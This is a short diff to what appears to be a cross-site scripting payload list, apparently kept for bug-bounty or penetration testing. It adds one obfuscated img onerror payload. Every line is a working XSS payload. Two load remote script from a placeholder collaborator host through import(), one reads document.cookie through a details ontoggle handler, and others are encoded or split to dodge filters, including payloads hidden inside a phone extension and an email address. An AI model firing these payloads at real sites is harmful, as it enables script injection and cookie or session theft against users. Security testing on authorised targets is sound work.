@@ -1,5 +1,6 @@
 013371337;ext=<img/src/onerror=import('//COLLABORATOR-HERE/')>
 "><img/src/onerror=import('//COLLABORATOR-HERE/')>"@wearehackerone.com
+<img%20hrEF="x"%20sRC="data:x,"%20oNLy=1%20oNErrOR=prompt`1`>
 <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
 %3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%601%60%3E
 ';k='e'%0Atop['al'+k+'rt'](1)//
